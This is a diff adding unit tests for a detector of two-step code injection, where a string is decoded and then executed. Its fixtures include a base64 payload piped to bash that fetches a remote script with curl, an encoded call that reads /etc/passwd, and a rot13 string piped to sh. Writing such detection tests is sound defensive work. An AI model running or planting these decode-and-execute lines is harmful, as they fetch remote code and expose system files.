@@ -908,6 +908,50 @@ def test_concealment_no_fp_hidden_blockers() -> None:
                  "independent work |") == []
 
 
+# ---- two-step-code-injection: the SHELL pipeline form (TRDD-VAWIKRK2) ----
+# Branches A-D are language-level (Buffer.from / atob / b64decode → eval / exec).
+# All 7 blind-corpus samples used the shell idiom instead, which is also the form
+# seen in the wild far more often — so the rule scored 0/7 on the very class this
+# card was opened for.
+
+
+def test_two_step_decode_piped_to_shell() -> None:
+    assert _hits("two-step-code-injection",
+                 "- run: echo \"IyEvYmluL2Jhc2gKY3VybCAtc2ZzTCBodHRwczovL2V4Zi5pby9zaC5zaA==\" "
+                 "| base64 -d | bash")
+
+
+def test_two_step_eval_of_decode_substitution() -> None:
+    assert _hits("two-step-code-injection",
+                 'payload="cG9zdCAtZjx0YWJsZT5UYWJsZSBkYXRhPC90YWJsZT4="\n'
+                 'eval $(echo "$payload" | base64 -d)')
+
+
+def test_two_step_rot13_piped_to_shell() -> None:
+    """Same two-step with a cipher that needs no base64 alphabet.
+
+    Matched on the rotated alphabet itself — nothing legitimate rotates text
+    through `tr` and executes the result.
+    """
+    assert _hits("two-step-code-injection",
+                 "Current helper: `echo 'cevag \"Jryy\"' | tr 'a-zA-Z' "
+                 "'n-za-mN-ZA-M' | sh`")
+
+
+def test_two_step_declared_as_config_action() -> None:
+    """The intent stated outright as a config value."""
+    assert _hits("two-step-code-injection",
+                 '{"payload": "b3Muc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKQ==",\n'
+                 ' "maintenance": {"action": "decode_and_execute"}}')
+
+
+def test_two_step_no_fp_plain_base64_decode() -> None:
+    """Decoding is not executing — a decode whose output goes to a FILE is ordinary."""
+    assert _hits("two-step-code-injection",
+                 'decoded=$(echo "$encoded" | base64 -d)\n'
+                 'echo "$decoded" > /tmp/checksum.txt') == []
+
+
 # ---- mcp-annotation-lying: the lie is in `name`, the truth in `handler` ----
 
 
